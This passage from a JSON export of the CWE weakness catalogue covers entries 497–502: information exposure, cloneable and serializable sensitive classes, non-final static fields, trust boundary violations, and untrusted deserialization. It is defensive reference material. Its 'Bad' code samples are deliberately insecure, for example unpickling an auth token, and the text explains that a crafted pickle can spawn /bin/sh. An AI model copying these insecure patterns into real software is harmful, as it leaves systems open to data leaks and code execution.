          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "497",
      "Name": "Exposure of Sensitive System Information to an Unauthorized Control Sphere",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.",
      "ExtendedDescription": "\n\nNetwork-based products, such as web applications, often run on top of an operating system or similar environment. When the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other OS users, installed packages, the application environment, etc. This system information may be provided by the product itself, or buried within diagnostic or debugging messages. Debugging information helps an adversary learn about the system and form an attack plan.\n\n\nAn information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. Using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts. An attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. A product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "200",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code prints the path environment variable to the standard error stream:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* path = getenv(\"PATH\");\n\t...\n\tsprintf(stderr, \"cannot find exe on path %s\\n\", path);\n```"
            }
          ]
        },
        {
          "ID": "DX-68",
          "Entries": [
            {
              "IntroText": "This code prints all of the running processes belonging to the current user."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78)* \n\t$userName = getCurrentUser();\n\t$command = 'ps aux | grep ' . $userName;\n\tsystem($command);"
            },
            {
              "BodyText": "If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code prints an exception to the standard error stream:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n\t\t...\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\ttry {\n\t\t...\n\t} catch (Exception e) {\n\t\tConsole.Writeline(e);\n\t}\n```"
            },
            {
              "BodyText": "Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system will be vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tstring cs=\"database=northwind; server=mySQLServer...\";\n\tSqlConnection conn=new SqlConnection(cs);\n\t...\n\tConsole.Writeline(cs);\n```"
            },
            {
              "BodyText": "Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-32638",
          "Description": "Code analysis product passes access tokens as a command-line parameter or through an environment variable, making them visible to other processes via the ps command.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-32638"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "System Information Leak"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR01-J",
          "EntryName": "Do not allow exceptions to expose sensitive information"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "RelatedAttackPatterns": [
        "170",
        "694"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "498",
      "Name": "Cloneable Class Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.",
      "ExtendedDescription": "Cloneable classes are effectively open classes, since data cannot be hidden in them. Classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "200",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "A class that can be cloned can be produced without executing the constructor. This is dangerous since the constructor may perform security-related checks. By allowing the object to be cloned, those checks may be bypassed."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If you do make your classes clonable, ensure that your clone method is final and throw super.clone()."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class CloneClient {\n\t\t\tpublic CloneClient() //throws\n\t\t\tjava.lang.CloneNotSupportedException {\n\t\t\t\t\tTeacher t1 = new Teacher(\"guddu\",\"22,nagar road\");\n\t\t\t\t\t//...\n\t\t\t\t\t// Do some stuff to remove the teacher.\n\t\t\t\t\tTeacher t2 = (Teacher)t1.clone();\n\t\t\t\t\tSystem.out.println(t2.name);\n\t\t\t}\n\t\t\tpublic static void main(String args[]) {\n\t\t\t\t\tnew CloneClient();\n\t\t\t}\n\t}\n\tclass Teacher implements Cloneable {\n\t\t\tpublic Object clone() {\n\t\t\t\t\ttry {\n\t\t\t\t\t\treturn super.clone();\n\t\t\t\t\t}\n\t\t\t\t\tcatch (java.lang.CloneNotSupportedException e) {\n\t\t\t\t\t\t\tthrow new RuntimeException(e.toString());\n\t\t\t\t\t}\n\t\t\t}\n\t\t\tpublic String name;\n\t\t\tpublic String clas;\n\t\t\tpublic Teacher(String name,String clas) {\n\t\t\t\t\tthis.name = name;\n\t\t\t\t\tthis.clas = clas;\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Make classes uncloneable by defining a clone function like:"
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic final void clone() throws java.lang.CloneNotSupportedException {\n\t\tthrow new java.lang.CloneNotSupportedException();\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Information leak through class cloning"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ07-J",
          "EntryName": "Sensitive classes must not let themselves be copied"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "499",
      "Name": "Serializable Class Containing Sensitive Data",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.",
      "ExtendedDescription": "Serializable classes are effectively open classes since data cannot be hidden in them. Classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "200",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "an attacker can write out the class to a byte stream, then extract the important data from it."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In Java, explicitly define final writeObject() to prevent serialization. This is the recommended solution. Define the writeObject() function to throw an exception explicitly denying serialization."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Make sure to prevent serialization of your objects."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code creates a new record for a medical patient:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tclass PatientRecord {\n\t\tprivate String name;\n\t\tprivate String socialSecurityNum;\n\t\tpublic Patient(String name,String ssn) {\n\t\t\tthis.SetName(name);\n\t\t\tthis.SetSocialSecurityNumber(ssn);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This object does not explicitly deny serialization, allowing an attacker to serialize an instance of this object and gain a patient's name and Social Security number even though those fields are private."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Information leak through serialization"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER03-J",
          "EntryName": "Do not serialize unencrypted, sensitive data"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER05-J",
          "EntryName": "Do not serialize instances of inner classes"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "500",
      "Name": "Public Static Field Not Marked Final",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.",
      "ExtendedDescription": "Public static variables can be read without an accessor and changed without a mutator by any classes in the application.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "493",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "When a field is declared public but not final, the field can be read and written to by arbitrary Java code."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "The object could potentially be tampered with."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The object could potentially allow the object to be read."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Clearly identify the scope for all critical data elements, including whether they should be regarded as static."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nMake any static fields private and constant.\n\n\nA constant field is denoted by the keyword 'const' in C/C++ and ' final' in Java\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following examples use of a public static String variable to contain the name of a property/configuration file for the application."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tclass SomeAppClass {\n\t\t\tpublic:\n\t\t\t\tstatic string appPropertiesConfigFile = \"app/properties.config\";\n\t\t\t...\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class SomeAppClass {\n\t\t\tpublic static String appPropertiesFile = \"app/Application.properties\";\n\t\t\t...\n\t}\n```"
            },
            {
              "BodyText": "Having a public static variable that is not marked final (constant) may allow the variable to the altered in a way not intended by the application. In this example the String variable can be modified to indicate a different on nonexistent properties file which could cause the application to crash or caused unexpected behavior."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tclass SomeAppClass {\n\t\t\tpublic:\n\t\t\t\tstatic const string appPropertiesConfigFile = \"app/properties.config\";\n\t\t\t...\n\t}\n```"
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class SomeAppClass {\n\t\t\tpublic static final String appPropertiesFile = \"app/Application.properties\";\n\t\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Overflow of static internal buffer"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ10-J",
          "EntryName": "Do not use public static nonfinal variables"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "501",
      "Name": "Trust Boundary Violation",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product mixes trusted and untrusted data in the same data structure or structured message.",
      "ExtendedDescription": "A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tusrname = request.getParameter(\"usrname\");\n\tif (session.getAttribute(ATTR_USR) == null) {\n\t\tsession.setAttribute(ATTR_USR, usrname);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tusrname = request.Item(\"usrname\");\n\tif (session.Item(ATTR_USR) == null) {\n\t\tsession.Add(ATTR_USR, usrname);\n\t}\n```"
            },
            {
              "BodyText": "Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Trust Boundary Violation"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "502",
      "Name": "Deserialization of Untrusted Data",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
      "ExtendedDescription": "\n\nIt is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.\n\n\nData that is untrusted can not be trusted to be well-formed.\n\n\nWhen developers place no restrictions on \"gadget chains,\" or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.\n",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "915",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Ruby",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Python",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "JavaScript",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Often"
        }
      ],
      "BackgroundDetails": [
        "Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred (\"serialization\"), then extracting the serialized data to reconstruct the original object (\"deserialization\")."
      ],
      "AlternateTerms": [
        {
          "Term": "Marshaling, Unmarshaling",
          "Description": "Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively."
        },
        {
          "Term": "Pickling, Unpickling",
          "Description": "In Python, the \"pickle\" functionality is used to perform serialization and deserialization."
        },
        {
          "Term": "PHP Object Injection",
          "Description": "Some PHP application researchers use this term when attacking unsafe use of the unserialize() function; but it is also used for CWE-915."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data",
            "Unexpected State"
          ],
          "Note": "Attackers can modify unexpected objects or data that was assumed to be safe from modification."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)"
          ],
          "Note": "If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate."
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Explicitly define a final object() to prevent deserialization."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "\n\nMake fields transient to protect them from deserialization.\n\n\nAn attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code snippet deserializes an object from a file and uses it as a UI button:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n\t\tFile file = new File(\"object.obj\");\n\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(file));\n\t\tjavax.swing.JButton button = (javax.swing.JButton) in.readObject();\n\t\tin.close();\n\t}\n```"
            },
            {
              "BodyText": "This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed."
            },
            {
              "BodyText": "To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:"
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate final void readObject(ObjectInputStream in) throws java.io.IOException {\n\tthrow new java.io.IOException(\"Cannot be deserialized\"); }\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\ttry {\n\t\t\tclass ExampleProtocol(protocol.Protocol):\n\t\t\tdef dataReceived(self, data):\n\t\t\t# Code that would be here would parse the incoming data\n\t\t\t# After receiving headers, call confirmAuth() to authenticate\n\t\t\tdef confirmAuth(self, headers):\n\t\t\ttry:\n\t\t\ttoken = cPickle.loads(base64.b64decode(headers['AuthToken']))\n\t\t\tif not check_hmac(token['signature'], token['data'], getSecretKey()):\n\t\t\traise AuthFail\n\t\t\tself.secure_data = token['data']\n\t\t\texcept:\n\t\t\traise AuthFail\n\t}\n```"
            },
            {
              "BodyText": "Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object \"AuthToken\" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-12799",
